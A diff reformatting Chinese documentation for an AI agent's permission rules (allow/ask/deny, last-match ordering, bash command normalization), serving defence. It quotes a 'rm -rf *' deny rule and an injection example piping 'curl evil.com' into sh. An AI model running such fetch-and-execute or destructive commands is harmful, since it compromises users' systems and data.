@@ -4,32 +4,33 @@
 
 ## 三个 action
 
-| action | 语义 |
-|---|---|
-| `allow` | 静默放行 |
-| `ask` | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
-| `deny` | 抛 `DeniedError`，立刻中断工具调用 |
+| action  | 语义                                                               |
+| ------- | ------------------------------------------------------------------ |
+| `allow` | 静默放行                                                           |
+| `ask`   | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
+| `deny`  | 抛 `DeniedError`，立刻中断工具调用                                 |
 
 ## 配置格式
 
 ```jsonc
 {
   "permission": {
-    "bash": {                     // permission 类型（工具名）
-      "~/projects/*": "allow",    // 路径 pattern → action
+    "bash": {
+      // permission 类型（工具名）
+      "~/projects/*": "allow", // 路径 pattern → action
       "npm run *": "allow",
       "rm -rf *": "deny",
-      "*": "ask"
+      "*": "ask",
     },
     "skill": {
       "local-note": "deny",
-      "sora": "ask"
+      "sora": "ask",
     },
     "write": {
       "~/projects/**/*.md": "allow",
-      "*": "ask"
-    }
-  }
+      "*": "ask",
+    },
+  },
 }
 ```
 
@@ -40,30 +41,34 @@
 `PermissionNext.ask()`（`src/permission/next.ts:158`）用 `findLast` 扫描规则列表。所以：
 
 ```jsonc
-{ "bash": {
-  "*": "ask",              // 兜底
-  "npm run *": "allow"     // ← 这条生效（在 * 之后）
-}}
+{
+  "bash": {
+    "*": "ask", // 兜底
+    "npm run *": "allow", // ← 这条生效（在 * 之后）
+  },
+}
 ```
 
 顺序反了就坏：
 
 ```jsonc
-{ "bash": {
-  "npm run *": "allow",    // ← 这条被 * 覆盖，实际不生效
-  "*": "ask"
-}}
+{
+  "bash": {
+    "npm run *": "allow", // ← 这条被 * 覆盖，实际不生效
+    "*": "ask",
+  },
+}
 ```
 
 ## Bash 命令归一化
 
 `BashArity`（`src/permission/arity.ts:25`）把 shell 命令归一化为"语义命令前缀"再做 pattern 匹配，避免绕过：
 
-| 用户输入 | 归一化后 |
-|---|---|
-| `npm run test` | `npm run test` |
-| `npm run test -- --watch` | `npm run test`（选项被剥离） |
-| `cd foo && npm run test` | `npm run test`（前缀 cd 被剥离） |
+| 用户输入                  | 归一化后                         |
+| ------------------------- | -------------------------------- |
+| `npm run test`            | `npm run test`                   |
+| `npm run test -- --watch` | `npm run test`（选项被剥离）     |
+| `cd foo && npm run test`  | `npm run test`（前缀 cd 被剥离） |
 
 这意味着 `"npm run *": "allow"` 不会被 `npm run test; curl evil.com | sh` 这样的命令注入绕过——`BashArity` 会识别出 `;` 后的 `curl` 是独立命令，另走一次 permission 检查。
 
@@ -76,13 +81,13 @@ OpenCorvus 对内置 agent 工具和浏览器 MCP 权限默认 `allow`。用户�
   "permission": {
     "bash": {
       "*": "allow",
-      "rm -rf *": "deny"
+      "rm -rf *": "deny",
     },
     "write": {
       "*": "allow",
-      "~/projects/locked/**": "ask"
-    }
-  }
+      "~/projects/locked/**": "ask",
+    },
+  },
 }
 ```
 
